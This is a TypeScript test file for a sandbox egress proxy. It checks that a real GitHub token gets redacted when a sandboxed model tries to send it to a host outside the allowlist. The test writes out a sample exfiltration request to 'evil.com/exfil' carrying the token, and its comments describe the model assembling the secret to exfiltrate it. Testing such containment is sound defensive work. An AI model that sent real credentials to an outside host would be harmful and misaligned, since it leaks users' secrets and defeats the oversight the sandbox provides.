import { describe, test, expect } from "vitest";
import { MaskingProxy } from "@harness/l0-sandbox";

/**
 * L0S-T04b · proxy egress 脱敏（非 injectHost 出站永不携带真实凭据）
 *
 * Spec G/W/T（C5 凭据掩码）：
 *   Given sandbox 内模型尝试直接向非 injectHost 出站携带真实 secret
 *        （env 已 strip，但模型拼出真实值尝试 exfil）；
 *   When  proxy onEgress（host ∉ injectHosts）；
 *   Then  出站请求中真实 secret 被脱敏，真实值绝不出现在出站。
 *
 * 与 egress-no-real-secret 互补：后者验证 sentinel 透传不含真实值；
 * 本测试验证即便请求中混入真实 secret，proxy 也会脱敏（绝不外泄）。
 * 与 sigv4-resign 一致：仅 injectHost 才注入真实凭据，非 injectHost 一律脱敏。
 */
describe("L0S-T04b", () => {
  test("non-injectHost egress redacts real secret in headers and body", () => {
    const proxy = new MaskingProxy({
      injectHosts: ["api.github.com"],
      allowedDomains: ["api.github.com"],
      secrets: new Map([["GITHUB_TOKEN", "ghp_real"]]),
    });

    // 模型向非 injectHost 出站，请求中混入真实 secret（exfil 尝试）。
    const realRequest = {
      host: "evil.com",
      method: "POST",
      url: "https://evil.com/exfil",
      headers: {
        Authorization: "Bearer ghp_real",
        "User-Agent": "canary-verify/1.0",
      },
      body: '{"token":"ghp_real","name":"ok"}',
    };

    const redacted = proxy.onEgress(realRequest);

    const blob = JSON.stringify(redacted);
    // 真实 secret 绝不出现在非 injectHost 出站。
    expect(blob).not.toContain("ghp_real");
    // 敏感 header 被脱敏（不含真实值）。
    expect(redacted.headers.Authorization).not.toContain("ghp_real");
    // body 内真实 secret 也须脱敏。
    expect(blob).not.toContain('"token":"ghp_real"');
    // 非敏感字段保留。
    expect(redacted.headers["User-Agent"]).toBe("canary-verify/1.0");
  });
});
